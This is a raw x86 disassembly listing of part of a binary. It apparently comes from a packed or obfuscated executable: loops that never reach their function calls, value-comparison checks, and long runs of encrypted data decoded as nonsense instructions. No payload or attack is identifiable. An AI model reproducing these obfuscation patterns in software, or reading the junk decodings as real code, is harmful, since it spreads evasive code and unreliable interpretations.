  409422:	cli    
  409423:	shr    BYTE PTR [edx-0x48],0xca
  409427:	pusha  
  409428:	fdivr  QWORD PTR [edi+0x77]
  40942b:	dec    esp
  40942c:	std    
  40942d:	loopne 0x4093e7
  40942f:	fucom  st(5)
  409431:	mov    cl,0x7d
  409433:	stc    
  409434:	rol    DWORD PTR [edi-0x38],cl
  409437:	mov    bh,BYTE PTR [ebp+0xb1f2036]
  40943d:	out    0x99,al
  40943f:	jns    0x40941d
  409441:	push   eax
  409442:	cmp    DWORD PTR [esi+eax*1-0x3e],0xffffffd1
  409447:	je     0x409492
  409449:	lock cmp eax,0xa3465e16
  40944f:	cmp    ah,BYTE PTR [edx-0x5c]
  409452:	xor    DWORD PTR [edx-0x2a338211],esp
  409458:	mov    db4,edx
  40945b:	add    ebx,DWORD PTR [edx+0x6ea3e8ee]
  409461:	mov    al,dh
  409463:	inc    ebx
  409464:	pop    ecx
  409465:	mov    dl,BYTE PTR [eax]
  409467:	xchg   ecx,eax
  409468:	addr16 int3 
  40946a:	mov    al,0xb6
  40946c:	jmp    0xe049:0x4287e194
  409473:	sub    eax,edi
  409475:	inc    ebp
  409476:	in     al,dx
  409477:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40947d:	sub    esi,DWORD PTR [edi]
  40947f:	inc    ebx
  409480:	add    BYTE PTR [eax],al
  409482:	add    BYTE PTR [eax],al
  409484:	add    BYTE PTR [ebx],dh
  409486:	leave  
  409487:	add    ecx,DWORD PTR ds:0x43372b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43372b,ecx
  409494:	cmp    DWORD PTR ds:0x43372b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43372b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433613,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433677,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433677
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433677,ebx
  4094f1:	cmp    DWORD PTR ds:0x433677,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433677,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43367b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43367b
  409532:	inc    eax
  409533:	mov    ds:0x43367b,eax
  409538:	cmp    DWORD PTR ds:0x43367b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43367b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43367b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43367b
  40956d:	inc    eax
  40956e:	mov    ds:0x43367b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4336b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433623,0x433613
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433633,0x43372f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0x16b3d0b
  4095d3:	jb     0x409641
  4095d5:	fnstcw WORD PTR [esi+0x7e]
  4095d8:	jp     0x409657
  4095da:	jle    0x40965a
  4095dc:	mov    ebx,0x2576540
  4095e1:	aas    
  4095e2:	clc    
  4095e3:	push   es
  4095e4:	cmp    al,0x3b
  4095e6:	ret    0x44ba
  4095e9:	lea    ebp,[edx-0x4a]
  4095ec:	lock out 0x78,eax
  4095ef:	or     eax,0x3a3c68
  4095f4:	pop    esi
  4095f5:	pushf  
  4095f6:	popf   
  4095f7:	mov    ebp,0xa1aa9949
  4095fc:	enter  0xe977,0xda
  409600:	or     edi,DWORD PTR [ebp-0x5007a94a]
  409606:	in     eax,dx
  409607:	mov    ecx,0xccac03ee
  40960c:	outs   dx,BYTE PTR ds:[esi]
  40960d:	xor    al,0xba
  40960f:	sub    esi,esp
  409611:	mov    cl,0x26
  409613:	adc    eax,0xb1f4449e
  409618:	mov    bl,0xbd
  40961a:	mov    ah,0x88
  40961c:	les    esp,FWORD PTR [esi+0x46ca8939]
  409622:	lds    esp,FWORD PTR [eax+0x565f951d]
  409628:	loope  0x40967e
  40962a:	mov    ds:0x30b2cabd,al
  40962f:	push   esi
  409630:	(bad)  
  409631:	push   eax
  409632:	sbb    BYTE PTR [esi+0x17],dl
  409635:	pop    edi
  409636:	test   dh,al
  409638:	mov    esp,0xa4855629
  40963d:	ins    DWORD PTR es:[edi],dx
  40963e:	call   0x46c0:0x212710a6
  409645:	leave  
  409646:	xchg   ecx,eax
  409647:	inc    esp
  409648:	lods   eax,DWORD PTR ds:[esi]
  409649:	popf   
  40964a:	scas   eax,DWORD PTR es:[edi]
  40964b:	retf   0x5ac4
  40964e:	and    al,0x0
  409650:	and    ah,cl
  409652:	mov    esi,0x958ac741
  409657:	retf   0x99a2
  40965a:	xchg   esi,esp
  40965c:	icebp  
  40965d:	popa   
  40965e:	adc    eax,0xdb56f547
  409663:	test   edx,ebp
  409665:	jl     0x40967f
  409667:	fidivr WORD PTR [ebx-0x3a]
  40966a:	aad    0x38
  40966c:	push   esp
  40966d:	mov    al,ds:0x2aaf408e
  409672:	sub    al,0x2c
  409674:	mov    ecx,0xc90a75
  409679:	add    bl,cl
  40967b:	test   BYTE PTR [ebx+0x560a99be],cl
  409681:	add    eax,0x9c6a0b3b
  409686:	push   ebp
  409687:	ror    DWORD PTR [ecx],cl
  409689:	push   ss
  40968a:	mov    edx,0xff674c61
  40968f:	push   ss
  409690:	call   0x531d7f77
  409695:	retf   
  409696:	ret    0x4008
  409699:	retf   0x75c8
  40969c:	xchg   edx,eax
  40969d:	xchg   ecx,eax
  40969e:	add    BYTE PTR [edi+0x9],dh
  4096a1:	add    esi,DWORD PTR [esi+0x49]
  4096a4:	lods   eax,DWORD PTR ds:[esi]
  4096a5:	fiadd  WORD PTR [ebx-0x7e]
  4096a8:	imul   ebx,DWORD PTR [ecx+0x1],0x22fd419c
  4096af:	arpl   WORD PTR [ebp-0x74],sp
  4096b2:	jne    0x409699
  4096b4:	ins    BYTE PTR es:[edi],dx
  4096b5:	inc    edx
  4096b6:	or     ah,bl
  4096b8:	or     edx,esp
  4096ba:	inc    ecx
  4096bb:	sub    ch,ch
  4096bd:	ret    0x66a0
  4096c0:	test   BYTE PTR [edi-0x7250749d],bl
  4096c6:	jl     0x4096a6
  4096c8:	outs   dx,BYTE PTR ds:[esi]
  4096c9:	jns    0x409687
  4096cb:	mov    cs,WORD PTR [eax]
  4096cd:	in     al,0x5a
  4096cf:	push   ecx
  4096d0:	arpl   dx,si
  4096d2:	sar    DWORD PTR [eax-0x59d29d02],cl
  4096d8:	xchg   edi,eax
  4096d9:	es jmp 0x40967a
  4096dc:	xchg   ebp,eax
  4096dd:	sub    DWORD PTR [ecx],eax
  4096df:	lea    eax,[ecx+0x158cae24]
  4096e5:	ins    DWORD PTR es:[edi],dx
  4096e6:	retf   
  4096e7:	and    al,0xc1
  4096e9:	fcom   DWORD PTR ds:[edi]
  4096ec:	ins    DWORD PTR es:[edi],dx
  4096ed:	sahf   
  4096ee:	adc    BYTE PTR [edx-0x503ccb68],bh
  4096f4:	jb     0x409706
  4096f6:	shr    DWORD PTR [edx+ebp*2],cl
  4096f9:	dec    edx
  4096fa:	push   esi
  4096fb:	pushf  
  4096fc:	pop    ebp
  4096fd:	fwait
  4096fe:	xor    eax,0x51a5c352
  409703:	pop    eax
  409704:	in     al,dx
  409705:	ds cmp esp,ecx
  409708:	pop    ds
  409709:	xchg   ebp,eax
  40970a:	leave  
  40970b:	leave  
  40970c:	into   
  40970d:	jp     0x40970b
  40970f:	das    
  409710:	add    DWORD PTR ds:0xfff1929e,ebx
  409716:	pop    ebp
  409717:	and    eax,0xed1098f5
  40971c:	shr    esi,cl
  40971e:	and    BYTE PTR es:[edi-0x3c29a350],al
  409725:	and    DWORD PTR [ebp+0x20],edx
  409728:	pusha  
  409729:	inc    ebx
  40972a:	sbb    DWORD PTR [edx+0x48],0xa4dc20d2
  409731:	add    al,0x5f
  409733:	or     BYTE PTR [ebp-0x79f92fbc],ch
  409739:	test   ebp,edx
  40973b:	outs   dx,BYTE PTR ds:[esi]
  40973c:	sbb    al,0x54
  40973e:	ss enter 0x1a93,0xbb
  409743:	in     eax,dx
  409744:	in     eax,0x2c
  409746:	fisttp QWORD PTR [esi+eax*1-0x79a59fc3]
  40974d:	div    BYTE PTR ds:[edi]
  409750:	jne    0x409723
  409752:	mov    DWORD PTR [ebx],ebp
  409754:	jg     0x409740
  409756:	cli    
  409757:	jnp    0x409764
  409759:	ret    0x5098
  40975c:	lods   al,BYTE PTR ds:[esi]
  40975d:	pop    esp
  40975e:	and    al,0x19
  409760:	inc    esi
  409761:	stc    
  409762:	inc    esp
  409763:	pop    ds
  409764:	xor    eax,0xff73712f
  409769:	scas   al,BYTE PTR es:[edi]
  40976a:	data16 mov WORD PTR [edi-0x56cb6139],es
  409771:	jmp    0x40974b
  409773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409774:	dec    eax
  409775:	xchg   esi,edi
  409777:	jae    0x4097eb
  409779:	mov    cl,0x1e
  40977b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40977c:	jmp    0x15cb79e3
  409781:	in     al,dx
  409782:	test   al,0x48
  409784:	mov    ebx,0x3eb99f2c
  409789:	mov    ah,0x2f
  40978b:	test   al,0x59
  40978d:	jmp    FWORD PTR [ebx]
  40978f:	cs pop edi
  409791:	cdq    
  409792:	jmp    0x409781
  409794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409795:	cld    
  409796:	jmp    0x6ef9274b
  40979b:	lahf   
  40979c:	in     al,0x7
  40979e:	clc    
  40979f:	or     ah,BYTE PTR [esi+0x4c]
  4097a2:	(bad)  
  4097a3:	aad    0x58
  4097a5:	test   al,0x63
  4097a7:	mov    eax,0x75bc9ccf
  4097ac:	lahf   
  4097ad:	arpl   dx,bp
  4097af:	clc    
  4097b0:	rol    esp,1
  4097b2:	sbb    BYTE PTR [ebx],ch
  4097b4:	xor    al,0xdc
  4097b6:	jecxz  0x409824
  4097b8:	int    0x76
  4097ba:	iret   
  4097bb:	jo     0x4097ce
  4097bd:	mov    ss,WORD PTR [ebx-0x3c1d3a49]
  4097c3:	call   0x904d:0xa32b88d0
  4097ca:	xchg   edi,eax
  4097cb:	leave  
  4097cc:	loopne 0x40980f
  4097ce:	daa    
  4097cf:	(bad)  
  4097d0:	xor    edx,DWORD PTR [ecx]
  4097d2:	fidivr DWORD PTR [ebp+eiz*2+0x2e]
  4097d6:	in     al,0x53
  4097d8:	mov    ebx,DWORD PTR [ebx]
  4097da:	mov    al,0x22
  4097dc:	add    BYTE PTR [edx],ah
  4097de:	push   ds
  4097df:	shl    DWORD PTR [eax+0x7],1
  4097e2:	sbb    DWORD PTR [esi],edi
  4097e4:	ret    0xbdd
  4097e7:	xor    DWORD PTR [ebp-0x63],0xa636fc2d
  4097ee:	shl    WORD PTR [ebx],cl
  4097f1:	out    dx,al
  4097f2:	ret    
  4097f3:	pop    DWORD PTR [edx]
  4097f5:	loop   0x409779
  4097f7:	mov    ebx,0xcd284335
  4097fc:	xor    ah,ch
  4097fe:	push   ecx
  4097ff:	jnp    0x409800
  409801:	mov    esp,0xb6ecd7bb
  409806:	xchg   ebx,eax
  409807:	inc    ecx
  409808:	(bad)  
  409809:	adc    BYTE PTR [ebp+0x37e5a2a2],ah
  40980f:	mov    cl,0x7f
  409811:	ss push ebp
  409813:	jbe    0x409872
  409815:	test   al,al
  409817:	sbb    DWORD PTR [eax],edi
  409819:	mov    bl,0xdb
  40981b:	sahf   
  40981c:	aad    0xbe
  40981e:	mov    edi,0x67eb5420
  409823:	push   edi
  409824:	mov    dl,0x13
  409826:	and    al,0x91
  409828:	cdq    
  409829:	pop    esi
  40982a:	imul   ebx,DWORD PTR [edx+esi*1],0x8e6b3d3b
  409831:	int3   
  409832:	sbb    al,0x9e
  409834:	pop    ss
  409835:	mov    ecx,0x8e9c83e5
  40983a:	xchg   edi,eax
  40983b:	(bad)  
  40983c:	mov    eax,0x1ad36ce9
  409841:	and    edx,DWORD PTR [ebx+0x7e]
  409844:	rcl    edi,1
  409846:	in     eax,dx
  409847:	and    eax,DWORD PTR [ebp+0x2218e7da]
  40984d:	loop   0x4098b2
  40984f:	mov    bl,0x8c
  409851:	fist   WORD PTR [edx-0x47]
  409854:	test   ebp,0xe943fa9e
  40985a:	(bad)  
  40985b:	pop    eax
  40985c:	fistp  DWORD PTR [esi]
  40985e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40985f:	rcl    BYTE PTR [esi+0x58],0x5a
  409863:	lea    esi,[edi]
  409865:	inc    ebp
  409866:	mov    ebp,0xdd60b8ef
  40986b:	jo     0x40983f
  40986d:	std    
  40986e:	rcl    BYTE PTR [ebx+eax*8+0x1e3e67f9],1
  409875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409876:	test   al,0xee
  409878:	(bad)
  40987b:	add    bl,cl
  40987d:	xchg   dl,cl
  40987f:	lahf   
  409880:	mov    ss,WORD PTR ss:[edx*8-0x31bf08b9]
  409888:	and    eax,DWORD PTR [esi+esi*4+0x6e13fb3e]
  40988f:	pop    DWORD PTR [ebp-0x1bc7b10f]
  409895:	test   al,0xd7
  409897:	push   0xffffffec
  409899:	xor    al,0x51
  40989b:	jl     0x409866
  40989d:	ds jmp 0xe164:0xdc00bee1
  4098a5:	mov    dl,0x83
  4098a7:	mov    dl,0x58
  4098a9:	in     al,dx
  4098aa:	dec    edi
  4098ab:	adc    al,0xd8
  4098ad:	aas    
  4098ae:	adc    DWORD PTR [ebx],ecx
  4098b0:	xchg   BYTE PTR [edi+esi*8-0xd],al
  4098b4:	and    esp,DWORD PTR [esi-0x3d114f1b]
  4098ba:	fs loopne 0x4098f2
  4098bd:	mov    edx,0x1df0f6fa
  4098c2:	add    dl,dh
  4098c4:	fldenv [edi]
  4098c6:	retf   0xdd03
  4098c9:	push   edi
  4098ca:	pop    edx
  4098cb:	push   es
  4098cc:	or     DWORD PTR [esi-0x44],esi
  4098cf:	out    dx,eax
  4098d0:	scas   al,BYTE PTR es:[edi]
  4098d1:	and    al,0x23
  4098d3:	mov    ecx,0x8c3574cc
  4098d8:	aaa    
  4098d9:	sbb    DWORD PTR [edx-0x1968acd2],esp
  4098df:	mov    ebx,0x81c9b70f
  4098e4:	sbb    eax,0x43373b
  4098e9:	and    ebx,DWORD PTR [edx+0x0]
  4098ec:	add    BYTE PTR [ebx],al
  4098ee:	or     BYTE PTR [ecx],dl
  4098f0:	sbb    eax,0x4336a7
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433637
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43366f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43366f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43366f,ecx
  409918:	cmp    DWORD PTR ds:0x43366f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43366f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4336a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4336a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4336a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4337a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4336a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4336a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4336a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4336a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4336a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fstp   QWORD PTR [ebx-0x2]
  4099bf:	loopne 0x4099af
  4099c1:	push   0x7a7e7ee4
  4099c6:	jge    0x409a46
  4099c8:	jle    0x409a2f
  4099ca:	popf   
  4099cb:	lds    ebx,FWORD PTR ds:0x3fa319b1
  4099d1:	int    0xf2
  4099d3:	mov    bh,0x14
  4099d5:	jp     0x40996f
  4099d7:	fimul  WORD PTR [edx+0x7d27f386]
  4099dd:	cmp    ebp,edx
  4099df:	cmp    ecx,ebp
  4099e1:	lods   al,BYTE PTR ds:[esi]
  4099e2:	data16 (bad) 
  4099e4:	sahf   
  4099e5:	xchg   edi,eax
  4099e6:	jbe    0x4099bb
  4099e8:	repnz out 0x77,al
  4099eb:	push   ds
  4099ec:	hlt    
  4099ed:	les    edi,FWORD PTR [ecx-0x66f11861]
  4099f3:	arpl   WORD PTR [esi-0x5e15a488],si
  4099f9:	jb     0x409a76
  4099fb:	test   eax,0x76d9653e
  409a00:	pop    esi
  409a01:	adc    dl,cl
  409a03:	call   0xf9eee00f
  409a08:	or     BYTE PTR [esp+ecx*8-0x863412b],0xeb
  409a10:	adc    BYTE PTR [ebp-0x2d3340e9],bl
  409a16:	xchg   BYTE PTR [ebx-0xb],bh
  409a19:	inc    edx
  409a1a:	jno    0x409a22
  409a1c:	mov    ch,0x45
  409a1e:	nop
  409a1f:	bound  esp,QWORD PTR [edi+0x74bb9c36]
  409a25:	jmp    DWORD PTR [esp+ebp*8-0x31]
  409a29:	and    cl,BYTE PTR [ebp+eiz*4-0x72]
  409a2d:	jp     0x4099b1
  409a2f:	jns    0x409a45
  409a31:	rcr    BYTE PTR [edi-0x7ad926cf],0xc4
  409a38:	daa    
  409a39:	dec    edi
  409a3a:	std    
  409a3b:	int    0x49
  409a3d:	(bad)  
  409a3e:	cmp    ebx,edx
  409a40:	aam    0x90
  409a42:	add    DWORD PTR [edx],eax
  409a44:	mov    ecx,DWORD PTR [eax-0x56]
  409a47:	jl     0x409a50
  409a49:	xor    DWORD PTR [ebx+0x2a],esp
  409a4c:	adc    ecx,DWORD PTR [esi-0x415fcff3]
  409a52:	js     0x409a29
  409a54:	add    DWORD PTR [edi-0x25fd2e82],ecx
  409a5a:	mov    ch,0x6b
  409a5c:	mov    dl,0x97
  409a5e:	scas   al,BYTE PTR es:[edi]
  409a5f:	jmp    0xd60bcde9
  409a64:	mov    WORD PTR [ebp-0xd579c11],?
  409a6a:	ins    BYTE PTR es:[edi],dx
  409a6b:	jmp    0x507:0x78a7730e
  409a72:	push   es
  409a73:	jp     0x409a0f
  409a75:	jnp    0x409a67
  409a77:	pop    ecx
  409a78:	mov    al,0xbb
  409a7a:	xor    al,0x72
  409a7c:	inc    edi
  409a7d:	cmp    edx,DWORD PTR [esp+edx*1+0x6628901d]
  409a84:	jmp    0x6164:0xfa5954ee
  409a8b:	or     ebp,DWORD PTR [ebx]
  409a8d:	fs nop
  409a8f:	shr    BYTE PTR [ebp+0x6a],cl
  409a92:	lahf   
  409a93:	out    0x4c,al
  409a95:	pop    esi
  409a96:	(bad)  
  409a97:	fs shl dl,1
  409a9a:	cmp    eax,0x4e2b4e6
  409a9f:	adc    BYTE PTR [ecx-0x58],0xa5
  409aa3:	mov    DWORD PTR [edi+0x5ee59821],ecx
  409aa9:	jmp    0x7f64b452
  409aae:	lods   al,BYTE PTR ds:[esi]
  409aaf:	and    dh,BYTE PTR [ebp-0x57]
  409ab2:	xchg   edx,eax
  409ab3:	test   ebp,edi
  409ab5:	rcr    BYTE PTR [ecx],cl
  409ab7:	push   cs
  409ab8:	in     al,dx
  409ab9:	icebp  
  409aba:	out    0x19,al
  409abc:	scas   eax,DWORD PTR es:[edi]
  409abd:	inc    ebp
  409abe:	lahf   
  409abf:	sbb    DWORD PTR [eax],ebp
  409ac1:	cmp    eax,0x21a5d37d
  409ac6:	stos   DWORD PTR es:[edi],eax
  409ac7:	leave  
  409ac8:	mov    esi,0xadfd381
  409acd:	retf   
  409ace:	or     eax,0xd08343af
  409ad3:	add    BYTE PTR [ebp+0x32],al
  409ad6:	jmp    0xb93f98c8
  409adb:	inc    esi
  409adc:	test   al,0x52
  409ade:	jl     0x409a63
  409ae0:	fnstcw WORD PTR [edx+0x21]
  409ae3:	adc    ebx,0x5916ebd4
  409ae9:	and    edx,ebx
  409aeb:	mov    BYTE PTR [eax-0x50],0xbb
  409aef:	xchg   esi,ebx
  409af1:	jnp    0x409b2a
  409af3:	mov    ss,WORD PTR [ecx+0x31e288b1]
  409af9:	in     eax,dx
  409afa:	sbb    eax,0xe9d1f574
  409aff:	outs   dx,BYTE PTR ds:[esi]
  409b00:	inc    esp
  409b01:	imul   esi,edx,0x59426d77
  409b07:	mov    al,0x83
  409b09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b0b:	mov    al,0x69
  409b0d:	mov    ah,0xa6
  409b0f:	and    eax,0x4676e58
  409b14:	ror    DWORD PTR [edi-0x45050fb9],1
  409b1a:	xor    esp,DWORD PTR [ebp-0x4edb81d8]
  409b20:	sahf   
  409b21:	add    bl,BYTE PTR ds:0x1cdc6e2e
  409b27:	daa    
  409b28:	add    al,0x69
  409b2a:	(bad)  
  409b2b:	clc    
  409b2c:	out    0x46,eax
  409b2e:	and    al,0x62
  409b30:	leave  
  409b31:	cmp    al,0x26
  409b33:	cdq    
  409b34:	stos   BYTE PTR es:[edi],al
  409b35:	stos   BYTE PTR es:[edi],al
  409b36:	and    eax,0xff9b861a
  409b3b:	adc    DWORD PTR [edi-0xa120d7a],ebx
  409b41:	mov    ?,ebx
  409b43:	push   ds
  409b44:	int    0x4d
  409b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b47:	jmp    0x409afb
  409b49:	adc    BYTE PTR [eax+0xf],bl
  409b4c:	test   BYTE PTR ds:0x35101b67,ah
  409b52:	nop
  409b53:	adc    al,0x44
  409b55:	bound  eax,QWORD PTR [ebx-0x6e]
  409b58:	cmp    DWORD PTR [edx],ecx
  409b5a:	mov    ds:0xfcaa9623,eax
  409b5f:	inc    edi
  409b60:	and    cl,BYTE PTR [ecx-0x70]
  409b63:	sbb    bh,cl
  409b65:	lods   al,BYTE PTR ds:[esi]
  409b66:	sub    BYTE PTR [ebx+0xf],al
  409b69:	mov    bh,0x72
  409b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b6c:	call   0xbf84c9bf
  409b71:	push   es
  409b72:	aaa    
  409b73:	xchg   BYTE PTR [ecx-0x56a0e86d],al
  409b79:	pop    ecx
  409b7a:	shr    DWORD PTR [edx],0x86
  409b7d:	dec    ecx
  409b7e:	(bad)  
  409b7f:	push   ecx
  409b80:	mov    esp,0xb5548749
  409b85:	mov    ds:0x11f3a151,al
  409b8a:	jp     0x409b4a
  409b8c:	(bad)  
  409b8d:	fadd   QWORD PTR [ebp+0x73]
  409b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b91:	mov    al,0x5
  409b93:	jne    0x409bae
  409b95:	out    dx,eax
  409b96:	push   es
  409b97:	xchg   ch,al
  409b99:	cdq    
  409b9a:	out    dx,al
  409b9b:	gs aam 0xa
  409b9e:	ret    0x5842
  409ba1:	ins    DWORD PTR es:[edi],dx
  409ba2:	test   BYTE PTR [edi-0x4bebad3c],ch
  409ba8:	aad    0x73
  409baa:	test   BYTE PTR [ebp-0x2a9a4763],0x6a
  409bb1:	fs sub dl,cl
  409bb4:	repz mov dh,0xc0
  409bb7:	mov    ebx,0x67e8244d
  409bbc:	add    ebp,ebp
  409bbe:	retf   
  409bbf:	mov    ?,WORD PTR [edi+0x9]
  409bc2:	mov    bh,0x39
  409bc4:	inc    ebp
  409bc5:	dec    edx
  409bc6:	adc    DWORD PTR [ecx+edi*1+0x60863515],esp
  409bcd:	int3   
  409bce:	std    
  409bcf:	xor    DWORD PTR [eax+eiz*4+0x5babd6c2],edx
  409bd6:	inc    DWORD PTR [esi]
  409bd8:	adc    BYTE PTR [ebx],0x3e
  409bdb:	xor    DWORD PTR [ecx],esp
  409bdd:	and    dl,bh
  409bdf:	and    al,0x25
  409be1:	push   esi
  409be2:	ror    esi,1
  409be4:	or     DWORD PTR [ebx],edx
  409be6:	ds push 0x26be8053
  409bec:	cdq    
  409bed:	test   al,0x8b
  409bef:	jnp    0x409bd3
  409bf1:	das    
  409bf2:	push   edx
  409bf3:	in     al,dx
  409bf4:	pop    es
  409bf5:	pop    ebx
  409bf6:	sbb    ah,BYTE PTR [ebx+0x29432cc6]
  409bfc:	and    dl,BYTE PTR ds:0x3c5bed7a
  409c02:	in     eax,dx
  409c03:	dec    esi
  409c04:	fdiv   QWORD PTR [ebp+0x2c]
  409c07:	sub    eax,0x128b4167
  409c0c:	adc    DWORD PTR [eax],ecx
  409c0e:	arpl   WORD PTR ds:0xbb77dbc4,bx
  409c14:	adc    al,BYTE PTR [ebp+0x2d49e601]
  409c1a:	(bad)  
  409c1b:	cld    
  409c1c:	jo     0x409c3b
  409c1e:	lods   al,BYTE PTR ds:[esi]
  409c1f:	push   ebx
  409c20:	cmovs  eax,edx
  409c23:	leave  
  409c24:	inc    ebp
  409c25:	mov    ecx,0x6fa8a416
  409c2a:	and    DWORD PTR [ebx+ecx*2-0x3588f90e],eax
  409c31:	cli    
  409c32:	pop    eax
  409c33:	aam    0x2e
  409c35:	sub    dl,dl
  409c37:	cmp    bl,BYTE PTR [esi+0x18]
  409c3a:	enter  0x1873,0x3b
  409c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c3f:	call   FWORD PTR [edi-0x78d527f8]
  409c45:	jmp    0x3506:0xcbe34d23
  409c4c:	mov    ah,0x36
  409c4e:	mov    DWORD PTR [ebx],edi
  409c50:	push   edi
  409c51:	jmp    0x409c13
  409c53:	call   0x827eabd3
  409c58:	loopne 0x409cc8
  409c5a:	inc    edi
  409c5b:	stc    
  409c5c:	cmp    eax,DWORD PTR [ebp-0x18054712]
  409c62:	pop    edx
  409c63:	ins    BYTE PTR es:[edi],dx
  409c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c65:	(bad)  
  409c66:	mov    ch,0xf0
  409c68:	pop    es
  409c69:	mov    esi,0xa3fa85da
  409c6e:	mov    cl,0x9b
  409c70:	cld    
  409c71:	int    0xcd
  409c73:	in     al,dx
  409c74:	mov    esi,0x8205eb88
  409c79:	je     0x409c71
  409c7b:	fstp   DWORD PTR [eax-0x7e5fa81]
  409c81:	and    eax,0x4bdb47cf
  409c86:	aad    0x4b
  409c88:	add    al,0x32
  409c8a:	mov    bl,0xf2
  409c8c:	add    ebp,DWORD PTR [ecx+0x28]
  409c8f:	jnp    0x409ccb
  409c91:	dec    edx
  409c92:	repnz push esi
  409c94:	iret   
  409c95:	sub    al,BYTE PTR [ebx+0x69]
  409c98:	mov    eax,ds:0x9f1de5b9
  409c9d:	xchg   esp,eax
  409c9e:	or     BYTE PTR [ebp+ebp*4+0x7d],0x22
  409ca3:	out    dx,eax
  409ca4:	(bad)  
  409ca5:	jl     0x409d17
  409ca7:	mov    al,ds:0xe09e8d48
  409cac:	add    eax,0xa5dece9f
  409cb1:	mov    al,ds:0xbe87005d
  409cb6:	mov    BYTE PTR [edi-0x2b89520e],bh
  409cbc:	dec    eax
  409cbd:	mov    ch,0xe3
  409cbf:	xor    eax,0xbf2f060f
  409cc4:	addr16 pop ss
  409cc6:	push   0xddf68e0d
  409ccb:	adc    al,0x2f
  409ccd:	jne    0x40a399
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
